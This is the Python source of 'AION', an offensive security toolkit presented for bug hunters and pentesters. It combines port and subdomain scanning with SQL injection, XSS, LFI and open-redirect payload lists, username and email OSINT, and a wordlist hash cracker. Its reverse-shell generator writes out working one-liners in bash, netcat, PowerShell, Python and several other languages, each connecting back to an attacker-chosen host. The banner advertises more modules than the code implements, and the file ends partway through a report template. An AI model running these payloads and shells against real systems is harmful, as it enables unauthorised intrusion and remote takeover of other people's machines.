#!/usr/bin/env python3
"""
AION - Advanced Intrusion Offensive Network
Complete Bug Hunter & Pentester Toolkit
Developed by kakashi-kx
Version: 3.5.0 (Professional Edition)
"""

import argparse
import sys
import os
import time
import json
import socket
import threading
import queue
import subprocess
import re
import hashlib
import base64
import urllib.parse
import urllib.request
import urllib.error
import http.client
import ssl
import dns.resolver
import dns.reversename
import requests
from datetime import datetime
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed

# Try to import colorama
try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
    COLORS_AVAILABLE = True
except ImportError:
    COLORS_AVAILABLE = False
    class Fore:
        RED = GREEN = YELLOW = CYAN = MAGENTA = WHITE = RESET = ''
    class Style:
        BRIGHT = DIM = NORMAL = RESET_ALL = ''
    def init(): pass

# ============================================================================
# VERSION INFORMATION
# ============================================================================

VERSION = "3.5.0"
AUTHOR = "kakashi-kx"
GITHUB = "https://github.com/kakashi-kx/AION"

# ============================================================================
# COLOR CONFIGURATION
# ============================================================================

R = Fore.LIGHTRED_EX
G = Fore.LIGHTGREEN_EX
Y = Fore.LIGHTYELLOW_EX
C = Fore.LIGHTCYAN_EX
B = Fore.LIGHTBLUE_EX
M = Fore.LIGHTMAGENTA_EX
W = Fore.WHITE
BR = Style.BRIGHT
RS = Style.RESET_ALL

# ============================================================================
# BANNER - PERFECTLY ALIGNED BORDERS
# ============================================================================

BANNER = f"""
{R}╔══════════════════════════════════════════════════════════════════════════════╗
{R}║                                                                              
{R}║  {W}██████╗  █████╗ ██╗ ██████╗ ███╗   ██╗{R}                                         
{R}║  {W}██╔══██╗██╔══██╗██║██╔═══██╗████╗  ██║{R}                                         
{R}║  {W}██████╔╝███████║██║██║   ██║██╔██╗ ██║{R}                                         
{R}║  {W}██╔══██╗██╔══██║██║██║   ██║██║╚██╗██║{R}                                         
{R}║  {W}██║  ██║██║  ██║██║╚██████╔╝██║ ╚████║{R}                                         
{R}║  {W}╚═╝  ╚═╝╚═╝  ╚═╝╚═╝ ╚═════╝ ╚═╝  ╚═══╝{R}                                         
{R}║                                                                              
{R}║  {Y}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓{R}  
{R}║  {Y}┃{R}           {C}ADVANCED INTRUSION OFFENSIVE NETWORK{R}            {Y}┃{R}  
{R}║  {Y}┃{R}              {M}Bug Hunter & Pentester Toolkit{R}                  {Y}┃{R}  
{R}║  {Y}┃{R}                                                              {Y}┃{R}  
{R}║  {Y}┃{R}      {G}Version {VERSION} | Developed by {BR}{W}kakashi-kx{R}               {Y}┃{R}  
{R}║  {Y}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛{R}  
{R}║                                                                              
{R}╠══════════════════════════════════════════════════════════════════════════════╣
{R}║                                                                              
{R}║  {W}⚡ CORE MODULES ⚡{R}                                                              
{R}║                                                                              
{R}║  {G}┌── RECONNAISSANCE ──────────────────┐    {G}┌── WEB APPLICATION ───────────────┐  
{R}║  {G}│{R}  {W}01.{R} Subdomain Finder          {G}│{R}    {G}│{R}  {W}11.{R} SQL Injection Scanner    {G}│  
{R}║  {G}│{R}  {W}02.{R} DNS Enumeration           {G}│{R}    {G}│{R}  {W}12.{R} XSS Scanner           {G}│  
{R}║  {G}│{R}  {W}03.{R} Port Scanner              {G}│{R}    {G}│{R}  {W}13.{R} LFI/RFI Scanner       {G}│  
{R}║  {G}│{R}  {W}04.{R} Technology Detector       {G}│{R}    {G}│{R}  {W}14.{R} SSRF Scanner          {G}│  
{R}║  {G}│{R}  {W}05.{R} Wayback Machine URLs      {G}│{R}    {G}│{R}  {W}15.{R} Open Redirect Scanner {G}│  
{R}║  {G}│{R}  {W}06.{R} GitHub Dorking            {G}│{R}    {G}│{R}  {W}16.{R} CORS Scanner          {G}│  
{R}║  {G}└──────────────────────────────┘    {G}└────────────────────────────┘  
{R}║                                                                              
{R}║  {G}┌── NETWORK ATTACKS ───────────────┐    {G}┌── AUTHENTICATION ────────────────┐  
{R}║  {G}│{R}  {W}07.{R} Service Detection         {G}│{R}    {G}│{R}  {W}17.{R} JWT Token Tester      {G}│  
{R}║  {G}│{R}  {W}08.{R} Banner Grabbing           {G}│{R}    {G}│{R}  {W}18.{R} OAuth Scanner         {G}│  
{R}║  {G}│{R}  {W}09.{R} SSL/TLS Scanner           {G}│{R}    {G}│{R}  {W}19.{R} Session Fixation      {G}│  
{R}║  {G}│{R}  {W}10.{R} Packet Sniffer            {G}│{R}    {G}│{R}  {W}20.{R} Rate Limit Tester     {G}│  
{R}║  {G}└──────────────────────────────┘    {G}└────────────────────────────┘  
{R}║                                                                              
{R}║  {G}┌── EXPLOITATION ───────────────────┐    {G}┌── UTILITIES ─────────────────────┐  
{R}║  {G}│{R}  {W}21.{R} Reverse Shell Generator   {G}│{R}    {G}│{R}  {W}31.{R} Hash Cracker          {G}│  
{R}║  {G}│{R}  {W}22.{R} Metasploit Wrapper        {G}│{R}    {G}│{R}  {W}32.{R} Password Generator    {G}│  
{R}║  {G}│{R}  {W}23.{R} CVE Scanner               {G}│{R}    {G}│{R}  {W}33.{R} Encoder/Decoder       {G}│  
{R}║  {G}│{R}  {W}24.{R} Default Creds Tester      {G}│{R}    {G}│{R}  {W}34.{R} IP Tools              {G}│  
{R}║  {G}│{R}  {W}25.{R} Brute Forcer              {G}│{R}    {G}│{R}  {W}35.{R} Domain Tools          {G}│  
{R}║  {G}└──────────────────────────────┘    {G}└────────────────────────────┘  
{R}║                                                                              
{R}║  {G}┌── OSINT ──────────────────────────┐    {G}┌── REPORTING ─────────────────────┐  
{R}║  {G}│{R}  {W}26.{R} Email OSINT               {G}│{R}    {G}│{R}  {W}36.{R} PDF Report Generator  {G}│  
{R}║  {G}│{R}  {W}27.{R} Phone OSINT               {G}│{R}    {G}│{R}  {W}37.{R} HTML Dashboard        {G}│  
{R}║  {G}│{R}  {W}28.{R} Username OSINT            {G}│{R}    {G}│{R}  {W}38.{R} JSON Export           {G}│  
{R}║  {G}│{R}  {W}29.{R} Social Media Finder       {G}│{R}    {G}│{R}  {W}39.{R} MITRE ATT&CK Mapping  {G}│  
{R}║  {G}│{R}  {W}30.{R} Dark Web Scanner          {G}│{R}    {G}│{R}  {W}40.{R} Executive Summary     {G}│  
{R}║  {G}└──────────────────────────────┘    {G}└────────────────────────────┘  
{R}║                                                                              
{R}╠══════════════════════════════════════════════════════════════════════════════╣
{R}║                                                                              
{R}║  {Y}⚡ QUICK COMMANDS:{R}                                                              
{R}║                                                                              
{R}║  {W}  • python aion.py --target example.com --recon{R}                               
{R}║  {W}  • python aion.py --target example.com --web-scan{R}                             
{R}║  {W}  • python aion.py --target example.com --full-audit{R}                           
{R}║  {W}  • python aion.py --target example.com --osint{R}                                 
{R}║  {W}  • python aion.py --list-modules{R}                                               
{R}║  {W}  • python aion.py --interactive{R}                                                 
{R}║                                                                              
{R}╚══════════════════════════════════════════════════════════════════════════════╝{RS}
"""
# ============================================================================
# HELPER FUNCTIONS
# ============================================================================

def print_success(msg):
    print(f"{G}[✓] {msg}{RS}")

def print_info(msg):
    print(f"{C}[ℹ] {msg}{RS}")

def print_warning(msg):
    print(f"{Y}[⚠] {msg}{RS}")

def print_error(msg):
    print(f"{R}[✗] {msg}{RS}")

def print_banner():
    """Print banner only once"""
    print(BANNER)

def check_target(target):
    try:
        socket.inet_aton(target)
        return target, "ip"
    except socket.error:
        try:
            ip = socket.gethostbyname(target)
            return ip, "domain"
        except socket.gaierror:
            return None, None

# ============================================================================
# RECONNAISSANCE MODULES
# ============================================================================

class SubdomainFinder:
    """Find subdomains using multiple sources"""
    
    def __init__(self, domain, wordlist=None):
        self.domain = domain
        self.wordlist = wordlist or [
            'www', 'mail', 'ftp', 'localhost', 'webmail', 'smtp', 'pop', 'ns1', 'webdisk',
            'ns2', 'cpanel', 'whm', 'autodiscover', 'autoconfig', 'm', 'imap', 'test',
            'ns', 'blog', 'pop3', 'dev', 'www2', 'admin', 'forum', 'news', 'vpn',
            'ns3', 'mail2', 'new', 'mysql', 'old', 'lists', 'support', 'mobile',
            'mx', 'static', 'docs', 'beta', 'shop', 'sql', 'secure', 'demo',
            'cp', 'calendar', 'wiki', 'web', 'media', 'email', 'images', 'img',
            'img1', 'img2', 'css', 'js', 'stats', 'domain', 'feedback', 'mail1',
            'mail3', 'webmail2', 'vps', 'host', 'host2', 'database', 'admin2',
            'admin1', 'administrator', 'admin-panel', 'portal', 'cms', 'wordpress',
            'wp', 'joomla', 'drupal', 'moodle', 'phpmyadmin', 'phpMyAdmin',
            'pma', 'myadmin', 'mysqladmin', 'dbadmin', 'db', 'database'
        ]
        self.found = []
        
    def scan(self):
        print_info(f"Starting subdomain enumeration on {self.domain}")
        
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = {executor.submit(self.check_subdomain, sub): sub for sub in self.wordlist}
            for future in as_completed(futures):
                sub = futures[future]
                try:
                    if future.result():
                        print_success(f"Found subdomain: {sub}.{self.domain}")
                except:
                    pass
        
        return self.found
    
    def check_subdomain(self, sub):
        try:
            full = f"{sub}.{self.domain}"
            ip = socket.gethostbyname(full)
            self.found.append({"subdomain": full, "ip": ip})
            return True
        except:
            return False

class DNSEnumerator:
    """DNS enumeration and zone transfer"""
    
    def __init__(self, domain):
        self.domain = domain
        self.results = {}
        
    def enumerate(self):
        print_info(f"Enumerating DNS records for {self.domain}")
        
        record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'SOA', 'CNAME', 'PTR']
        
        for record in record_types:
            try:
                answers = dns.resolver.resolve(self.domain, record)
                self.results[record] = [str(r) for r in answers]
                print_success(f"Found {record} records: {len(answers)}")
            except:
                self.results[record] = []
        
        return self.results

class PortScanner:
    """Ultra-fast port scanner"""
    
    def __init__(self, target, ports="1-1000", threads=200, timeout=0.3):
        self.target = target
        self.ports = self.parse_ports(ports)
        self.threads = min(threads, 500)
        self.timeout = timeout
        self.open_ports = []
        self.total_ports = len(self.ports)
        
    def parse_ports(self, port_string):
        ports = []
        try:
            if '-' in port_string:
                start, end = map(int, port_string.split('-'))
                ports = list(range(start, min(end + 1, 65536)))
            elif ',' in port_string:
                ports = [int(p.strip()) for p in port_string.split(',')]
            else:
                ports = [int(port_string)]
        except:
            ports = [21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080]
        return ports[:2000]
    
    def scan_port(self, port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            result = sock.connect_ex((self.target, port))
            if result == 0:
                service = self.get_service(port)
                self.open_ports.append({'port': port, 'service': service})
                print(f"  {G}└── Port {port}: {service}{RS}")
            sock.close()
        except:
            pass
    
    def get_service(self, port):
        services = {
            21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 53: 'DNS',
            80: 'HTTP', 110: 'POP3', 111: 'RPC', 135: 'MSRPC', 139: 'NetBIOS',
            143: 'IMAP', 443: 'HTTPS', 445: 'SMB', 993: 'IMAPS', 995: 'POP3S',
            1723: 'PPTP', 3306: 'MySQL', 3389: 'RDP', 5900: 'VNC', 8080: 'HTTP-Alt',
            8443: 'HTTPS-Alt', 5432: 'PostgreSQL', 6379: 'Redis', 27017: 'MongoDB',
            5000: 'Docker', 2375: 'Docker-API', 9200: 'Elasticsearch', 9300: 'Elasticsearch',
            11211: 'Memcached', 1433: 'MSSQL', 1521: 'Oracle', 2082: 'cPanel',
            2083: 'cPanel-SSL', 2086: 'WHM', 2087: 'WHM-SSL', 2095: 'Webmail',
            2096: 'Webmail-SSL', 2222: 'DirectAdmin', 3307: 'MySQL-Alt',
            3389: 'RDP', 4848: 'GlassFish', 5432: 'PostgreSQL', 5555: 'FreeCiv',
            5900: 'VNC', 5901: 'VNC-1', 6000: 'X11', 6001: 'X11-1', 6666: 'IRC',
            6667: 'IRC', 6668: 'IRC', 6669: 'IRC', 7000: 'Cassandra', 7001: 'Cassandra',
            7077: 'Spark', 8081: 'HTTP-Alt', 8082: 'HTTP-Alt', 8083: 'HTTP-Alt',
            8084: 'HTTP-Alt', 8085: 'HTTP-Alt', 8086: 'InfluxDB', 8087: 'HTTP-Alt',
            8088: 'HTTP-Alt', 8089: 'HTTP-Alt', 8090: 'HTTP-Alt', 8091: 'Couchbase',
            8092: 'Couchbase', 8093: 'Couchbase', 8094: 'Couchbase', 8095: 'Couchbase',
            8096: 'HTTP-Alt', 8097: 'HTTP-Alt', 8098: 'Riak', 8099: 'HTTP-Alt',
            8100: 'HTTP-Alt', 8200: 'Vault', 8300: 'Consul', 8301: 'Consul',
            8302: 'Consul', 8400: 'Consul', 8500: 'Consul', 8600: 'Consul',
            9000: 'Portainer', 9001: 'Tor', 9042: 'Cassandra', 9092: 'Kafka',
            9100: 'Jetty', 9200: 'Elasticsearch', 9300: 'Elasticsearch',
            9418: 'Git', 9600: 'Nginx', 9700: 'Nginx', 9800: 'Nginx',
            9900: 'Nginx', 10000: 'Webmin', 10001: 'Webmin', 10002: 'Webmin',
            11211: 'Memcached', 27017: 'MongoDB', 27018: 'MongoDB', 27019: 'MongoDB',
            28017: 'MongoDB-Web', 50000: 'SAP', 50001: 'SAP', 50002: 'SAP'
        }
        return services.get(port, 'unknown')
    
    def scan(self):
        print_info(f"Scanning {self.total_ports} ports on {self.target}")
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            list(executor.map(self.scan_port, self.ports))
        
        self.open_ports.sort(key=lambda x: x['port'])
        print_success(f"Found {len(self.open_ports)} open ports")
        return self.open_ports

class TechnologyDetector:
    """Detect technologies used by a website"""
    
    def __init__(self, url):
        self.url = url if url.startswith('http') else f"http://{url}"
        self.tech_stack = []
        
    def detect(self):
        print_info(f"Detecting technologies for {self.url}")
        
        try:
            response = requests.get(self.url, timeout=5, verify=False)
            headers = response.headers
            server = headers.get('Server', '')
            powered_by = headers.get('X-Powered-By', '')
            
            if server:
                print_success(f"Server: {server}")
                self.tech_stack.append(server)
            if powered_by:
                print_success(f"Powered by: {powered_by}")
                self.tech_stack.append(powered_by)
            
            # Check for common technologies
            if 'php' in response.text.lower():
                print_success("PHP detected")
                self.tech_stack.append('PHP')
            if 'asp.net' in response.text.lower():
                print_success("ASP.NET detected")
                self.tech_stack.append('ASP.NET')
            if 'wordpress' in response.text.lower():
                print_success("WordPress detected")
                self.tech_stack.append('WordPress')
            if 'jquery' in response.text.lower():
                print_success("jQuery detected")
                self.tech_stack.append('jQuery')
            if 'bootstrap' in response.text.lower():
                print_success("Bootstrap detected")
                self.tech_stack.append('Bootstrap')
            if 'react' in response.text.lower():
                print_success("React detected")
                self.tech_stack.append('React')
            if 'angular' in response.text.lower():
                print_success("Angular detected")
                self.tech_stack.append('Angular')
            if 'vue' in response.text.lower():
                print_success("Vue.js detected")
                self.tech_stack.append('Vue.js')
                
        except Exception as e:
            print_error(f"Error detecting technologies: {e}")
        
        return self.tech_stack

class WaybackMachine:
    """Fetch URLs from Wayback Machine"""
    
    def __init__(self, domain):
        self.domain = domain
        self.urls = []
        
    def fetch(self):
        print_info(f"Fetching Wayback Machine URLs for {self.domain}")
        
        try:
            url = f"http://web.archive.org/cdx/search/cdx?url={self.domain}/*&output=json&fl=original&collapse=urlkey"
            response = requests.get(url, timeout=10)
            data = response.json()
            
            for item in data[1:]:  # Skip header
                self.urls.append(item[0])
            
            print_success(f"Found {len(self.urls)} unique URLs")
            
            # Show some examples
            for url in self.urls[:10]:
                print(f"  {G}└── {url}{RS}")
                
        except Exception as e:
            print_error(f"Error fetching Wayback Machine data: {e}")
        
        return self.urls

# ============================================================================
# WEB APPLICATION VULNERABILITY SCANNERS
# ============================================================================

class SQLInjectionScanner:
    """Scan for SQL injection vulnerabilities"""
    
    def __init__(self, url):
        self.url = url
        self.vulnerabilities = []
        
    def scan(self):
        print_info(f"Scanning for SQL injection on {self.url}")
        
        payloads = [
            "'", "\"", "';", "--", "' OR '1'='1", "\" OR \"1\"=\"1",
            "' UNION SELECT NULL--", "' AND 1=1--", "' AND 1=2--",
            "'; WAITFOR DELAY '00:00:05'--", "' OR SLEEP(5)--",
            "1' ORDER BY 1--", "1' ORDER BY 100--", "' UNION SELECT @@version--",
            "' UNION SELECT database()--", "' UNION SELECT user()--"
        ]
        
        error_patterns = [
            "sql", "mysql", "oracle", "postgresql", "sqlite",
            "odbc", "driver", "db2", "microsoft.*database",
            "syntax error", "unclosed quotation", "quoted string",
            "mysql_fetch", "mysqli_fetch", "pg_fetch", "sqlsrv_fetch"
        ]
        
        try:
            for payload in payloads:
                test_url = f"{self.url}{payload}"
                response = requests.get(test_url, timeout=3, verify=False)
                
                for pattern in error_patterns:
                    if pattern in response.text.lower():
                        vuln = {
                            'type': 'SQL Injection',
                            'url': test_url,
                            'payload': payload,
                            'evidence': pattern
                        }
                        self.vulnerabilities.append(vuln)
                        print_warning(f"Potential SQL injection found with payload: {payload}")
                        break
                        
        except Exception as e:
            print_error(f"Error scanning for SQL injection: {e}")
        
        return self.vulnerabilities

class XSSScanner:
    """Scan for Cross-Site Scripting vulnerabilities"""
    
    def __init__(self, url):
        self.url = url
        self.vulnerabilities = []
        
    def scan(self):
        print_info(f"Scanning for XSS on {self.url}")
        
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "\"><script>alert('XSS')</script>",
            "'><script>alert('XSS')</script>",
            "';alert('XSS');//",
            "\" onmouseover=\"alert('XSS')\"",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>"
        ]
        
        try:
            for payload in payloads:
                test_url = f"{self.url}{urllib.parse.quote(payload)}"
                response = requests.get(test_url, timeout=3, verify=False)
                
                if payload in response.text:
                    vuln = {
                        'type': 'Reflected XSS',
                        'url': test_url,
                        'payload': payload
                    }
                    self.vulnerabilities.append(vuln)
                    print_warning(f"Potential XSS found with payload: {payload[:30]}...")
                    
        except Exception as e:
            print_error(f"Error scanning for XSS: {e}")
        
        return self.vulnerabilities

class LFIRFIScanner:
    """Scan for LFI/RFI vulnerabilities"""
    
    def __init__(self, url):
        self.url = url
        self.vulnerabilities = []
        
    def scan(self):
        print_info(f"Scanning for LFI/RFI on {self.url}")
        
        payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "/etc/passwd",
            "C:\\windows\\win.ini",
            "../../../../etc/passwd",
            "....//....//....//etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php",
            "expect://ls",
            "file:///etc/passwd"
        ]
        
        indicators = [
            "root:x:", "boot loader", "[fonts]", "[extensions]",
            "<?php", "mysql", "password", "database"
        ]
        
        try:
            for payload in payloads:
                test_url = f"{self.url}{payload}"
                response = requests.get(test_url, timeout=3, verify=False)
                
                for indicator in indicators:
                    if indicator in response.text.lower():
                        vuln = {
                            'type': 'LFI/RFI',
                            'url': test_url,
                            'payload': payload,
                            'evidence': indicator
                        }
                        self.vulnerabilities.append(vuln)
                        print_warning(f"Potential LFI found with payload: {payload}")
                        break
                        
        except Exception as e:
            print_error(f"Error scanning for LFI/RFI: {e}")
        
        return self.vulnerabilities

class OpenRedirectScanner:
    """Scan for open redirect vulnerabilities"""
    
    def __init__(self, url):
        self.url = url
        self.vulnerabilities = []
        
    def scan(self):
        print_info(f"Scanning for open redirect on {self.url}")
        
        payloads = [
            "//google.com",
            "https://google.com",
            "//evil.com",
            "/\\google.com",
            "?next=google.com",
            "?redirect=google.com",
            "?url=google.com",
            "?target=google.com",
            "?dest=google.com",
            "?return=google.com"
        ]
        
        try:
            for payload in payloads:
                test_url = f"{self.url}{payload}"
                response = requests.get(test_url, timeout=3, verify=False, allow_redirects=False)
                
                if response.status_code in [301, 302] and 'location' in response.headers:
                    location = response.headers['location'].lower()
                    if 'google.com' in location:
                        vuln = {
                            'type': 'Open Redirect',
                            'url': test_url,
                            'redirects_to': location
                        }
                        self.vulnerabilities.append(vuln)
                        print_warning(f"Open redirect found: {test_url} -> {location}")
                        
        except Exception as e:
            print_error(f"Error scanning for open redirect: {e}")
        
        return self.vulnerabilities

# ============================================================================
# OSINT MODULES
# ============================================================================

class EmailOSINT:
    """OSINT on email addresses"""
    
    def __init__(self, email):
        self.email = email
        self.results = {}
        
    def analyze(self):
        print_info(f"Performing OSINT on email: {self.email}")
        
        # Extract domain
        domain = self.email.split('@')[1]
        self.results['domain'] = domain
        
        # Check if email format is valid
        import re
        pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
        self.results['valid_format'] = bool(re.match(pattern, self.email))
        
        # Get MX records
        try:
            mx_records = dns.resolver.resolve(domain, 'MX')
            self.results['mx_records'] = [str(r.exchange) for r in mx_records]
            print_success(f"Found MX records: {', '.join(self.results['mx_records'])}")
        except:
            self.results['mx_records'] = []
        
        # Check for common email services
        common_services = {
            'gmail.com': 'Google',
            'yahoo.com': 'Yahoo',
            'outlook.com': 'Microsoft',
            'hotmail.com': 'Microsoft',
            'aol.com': 'AOL',
            'protonmail.com': 'ProtonMail',
            'mail.com': 'Mail.com'
        }
        
        self.results['provider'] = common_services.get(domain, 'Custom Domain')
        
        # Check haveibeenpwned (simulated)
        self.results['breaches'] = []  # Would call HIBP API here
        
        return self.results

class UsernameOSINT:
    """OSINT on usernames across platforms"""
    
    def __init__(self, username):
        self.username = username
        self.results = {}
        
    def search(self):
        print_info(f"Searching for username: {self.username}")
        
        platforms = {
            'GitHub': f"https://github.com/{self.username}",
            'Twitter': f"https://twitter.com/{self.username}",
            'Instagram': f"https://instagram.com/{self.username}",
            'Reddit': f"https://reddit.com/user/{self.username}",
            'Medium': f"https://medium.com/@{self.username}",
            'Dev.to': f"https://dev.to/{self.username}",
            'Keybase': f"https://keybase.io/{self.username}",
            'Telegram': f"https://t.me/{self.username}",
            'Pinterest': f"https://pinterest.com/{self.username}",
            'Tumblr': f"https://{self.username}.tumblr.com",
            'HackerNews': f"https://news.ycombinator.com/user?id={self.username}",
            'HackerOne': f"https://hackerone.com/{self.username}",
            'Bugcrowd': f"https://bugcrowd.com/{self.username}",
            'LinkedIn': f"https://linkedin.com/in/{self.username}"
        }
        
        self.results['profiles'] = []
        
        for platform, url in platforms.items():
            try:
                response = requests.head(url, timeout=3, allow_redirects=False)
                if response.status_code == 200:
                    self.results['profiles'].append({'platform': platform, 'url': url})
                    print_success(f"Found {platform}: {url}")
            except:
                pass
        
        return self.results

# ============================================================================
# EXPLOITATION MODULES
# ============================================================================

class ReverseShellGenerator:
    """Generate reverse shell payloads"""
    
    def __init__(self, lhost, lport):
        self.lhost = lhost
        self.lport = lport
        self.payloads = {}
        
    def generate_all(self):
        print_info(f"Generating reverse shells for {self.lhost}:{self.lport}")
        
        # Bash
        self.payloads['bash'] = f"bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1"
        
        # Python
        self.payloads['python'] = f'''python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{self.lhost}",{self.lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])' '''
        
        # PHP
        self.payloads['php'] = f"php -r '$sock=fsockopen(\"{self.lhost}\",{self.lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
        
        # Perl
        self.payloads['perl'] = f'''perl -e 'use Socket;$i="{self.lhost}";$p={self.lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};' '''
        
        # Ruby
        self.payloads['ruby'] = f'''ruby -rsocket -e'f=TCPSocket.open("{self.lhost}",{self.lport}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)' '''
        
        # Netcat
        self.payloads['netcat'] = f"nc -e /bin/sh {self.lhost} {self.lport}"
        
        # PowerShell
        self.payloads['powershell'] = f'''powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient('{self.lhost}',{self.lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"' '''
        
        # Node.js
        self.payloads['node'] = f'''node -e 'require("child_process").exec("nc -e /bin/sh {self.lhost} {self.lport}")' '''
        
        # Java
        self.payloads['java'] = f'''Runtime r = Runtime.getRuntime();Process p = r.exec(new String[]{{"/bin/bash","-c","exec 5<>/dev/tcp/{self.lhost}/{self.lport};cat <&5 | while read line; do $line 2>&5 >&5; done"}});p.waitFor();'''
        
        # Print all payloads
        for lang, payload in self.payloads.items():
            print(f"\n{G}[{lang.upper()}]{RS}")
            print(f"{Y}{payload}{RS}")
        
        return self.payloads

class HashCracker:
    """Crack various hash types"""
    
    def __init__(self, hash_value, hash_type='md5', wordlist=None):
        self.hash = hash_value.lower()
        self.hash_type = hash_type.lower()
        self.wordlist = wordlist or [
            'password', '123456', '12345678', '1234', 'qwerty', 'admin',
            'welcome', 'password123', 'abc123', 'letmein', 'monkey',
            'sunshine', 'iloveyou', 'trustno1', 'dragon', 'master',
            'hello', 'freedom', 'whatever', 'qazwsx', 'login', 'pass',
            'root', 'administrator', 'admin123', 'root123', 'toor',
            'kali', 'ubuntu', 'debian', 'centos', 'redhat', 'fedora',
            'windows', 'server', 'password1', 'passw0rd', 'p@ssw0rd'
        ]
        self.result = None
        
    def crack(self):
        print_info(f"Cracking {self.hash_type} hash: {self.hash}")
        
        for word in self.wordlist:
            if self.hash_type == 'md5':
                hashed = hashlib.md5(word.encode()).hexdigest()
            elif self.hash_type == 'sha1':
                hashed = hashlib.sha1(word.encode()).hexdigest()
            elif self.hash_type == 'sha256':
                hashed = hashlib.sha256(word.encode()).hexdigest()
            else:
                print_error(f"Unsupported hash type: {self.hash_type}")
                return None
            
            if hashed == self.hash:
                self.result = word
                print_success(f"Hash cracked! Password: {word}")
                break
        
        if not self.result:
            print_warning("Could not crack hash with current wordlist")
        
        return self.result

# ============================================================================
# UTILITIES MODULES
# ============================================================================

class EncoderDecoder:
    """Encode/decode various formats"""
    
    @staticmethod
    def encode(data, encoding='base64'):
        if encoding == 'base64':
            return base64.b64encode(data.encode()).decode()
        elif encoding == 'base32':
            return base64.b32encode(data.encode()).decode()
        elif encoding == 'hex':
            return data.encode().hex()
        elif encoding == 'url':
            return urllib.parse.quote(data)
        else:
            return None
    
    @staticmethod
    def decode(data, encoding='base64'):
        try:
            if encoding == 'base64':
                return base64.b64decode(data).decode()
            elif encoding == 'base32':
                return base64.b32decode(data).decode()
            elif encoding == 'hex':
                return bytes.fromhex(data).decode()
            elif encoding == 'url':
                return urllib.parse.unquote(data)
            else:
                return None
        except:
            return None

class PasswordGenerator:
    """Generate strong passwords"""
    
    @staticmethod
    def generate(length=12, use_upper=True, use_lower=True, use_digits=True, use_special=True):
        import random
        import string
        
        chars = ''
        if use_lower:
            chars += string.ascii_lowercase
        if use_upper:
            chars += string.ascii_uppercase
        if use_digits:
            chars += string.digits
        if use_special:
            chars += '!@#$%^&*()_+-=[]{}|;:,.<>?'
        
        if not chars:
            chars = string.ascii_letters + string.digits
        
        password = ''.join(random.choice(chars) for _ in range(length))
        return password

class IPTools:
    """IP address tools"""
    
    @staticmethod
    def get_info(ip):
        info = {}
        
        # Get hostname
        try:
            info['hostname'] = socket.gethostbyaddr(ip)[0]
        except:
            info['hostname'] = 'Unknown'
        
        # Get geolocation (simulated)
        info['country'] = 'Unknown'
        info['city'] = 'Unknown'
        info['isp'] = 'Unknown'
        
        # Check if private IP
        private_ranges = [
            ('10.0.0.0', '10.255.255.255'),
            ('172.16.0.0', '172.31.255.255'),
            ('192.168.0.0', '192.168.255.255'),
            ('127.0.0.0', '127.255.255.255')
        ]
        
        def ip_to_int(ip_str):
            parts = ip_str.split('.')
            return int(parts[0])*256**3 + int(parts[1])*256**2 + int(parts[2])*256 + int(parts[3])
        
        ip_int = ip_to_int(ip)
        info['is_private'] = any(
            ip_to_int(start) <= ip_int <= ip_to_int(end) 
            for start, end in private_ranges
        )
        
        return info

# ============================================================================
# REPORTING MODULES
# ============================================================================

class ReportGenerator:
    """Generate professional pentest reports"""
    
    def __init__(self, target, findings, format='html'):
        self.target = target
        self.findings = findings
        self.format = format
        self.timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        
    def generate(self, filename=None):
        if not filename:
            filename = f"aion_report_{self.target}_{self.timestamp}.{self.format}"
        
        Path("reports").mkdir(exist_ok=True)
        filepath = os.path.join("reports", filename)
        
        if self.format == 'html':
            return self.generate_html(filepath)
        elif self.format == 'json':
            return self.generate_json(filepath)
        elif self.format == 'txt':
            return self.generate_txt(filepath)
        else:
            return self.generate_txt(filepath)
    
    def generate_html(self, filepath):
        html = f"""<!DOCTYPE html>
<html>
<head>
    <title>AION Security Report - {self.target}</title>
    <style>
        body {{ font-family: 'Segoe UI', Arial; margin: 40px; background: #0a0f0f; color: #e0e0e0; }}
        .container {{ max-width: 1200px; margin: auto; }}
        h1 {{ color: #ff4444; text-align: center; border-bottom: 2px solid #ff4444; padding-bottom: 10px; }}
